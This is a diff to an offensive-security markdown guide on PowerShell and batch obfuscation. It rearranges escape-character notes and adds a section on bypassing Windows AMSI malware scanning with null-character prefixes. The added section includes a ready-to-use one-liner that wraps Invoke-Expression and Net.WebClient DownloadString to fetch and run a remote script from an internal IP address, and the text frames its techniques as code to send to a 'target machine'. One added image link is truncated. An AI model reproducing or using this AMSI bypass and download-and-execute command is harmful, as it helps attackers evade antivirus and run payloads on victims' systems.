@@ -30,6 +30,14 @@
       interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
       console, then the powershell interpreter will not be able to escape the special character.
 
+**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
+![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)
+
+**Good character sellection** [ powershell special character used in powershell interpreter ]
+![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
+
+<br />
+
       Its also a good practice to test your obfuscation sourcecode in 'target' terminal console to check
       if the code its not broken with a missplaced special character or other diferent thing interfering
       with sourcecode normal execution, before sending your obfuscated code to target machine ..
@@ -38,15 +46,9 @@
       1º - Start Windows PowerShell with the "Run as Administrator" option.
       2º - Execute the follow in terminal: set-executionpolicy remotesigned
 
-**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
-![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)
-
-**Good character sellection** [ powershell special character used in powershell interpreter ]
-![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
-
 ---
 
-<br /><br />
+<br /><br /><br />
 
 ## Glosario (Index):
 [0] <- Yes, just because in computing 0 its an importante number too :P<br />
@@ -735,8 +737,23 @@ Here we can view the all process of encoding/decoding in powershell console
 
 - **Being mean** .. [ one agent.bat with AMSI bypass abilities ;) ]<br />
 
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/cuJSGj.png)
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/T1TFFB.png)
 
+
+<br />
+
+- AMSI bypass using nul characters before the actual funtion occurs
+
+      Bypass AMSI mechanism using nul characters before the actual funtion occurs
+      For file contents, insert "#<NULL>" at the beginning of the file, and any places
+      where additional scans with AMSI occur. For command line contents, wrap them into
+      Invoke-Expression and prepend "'if(0){{{0}}}' -f $(0 -as [char]) +".
+
+<br />
+
+       powershell "IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
+
+![enigma0x3 - AMSI Bypass](http://i.)
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
 
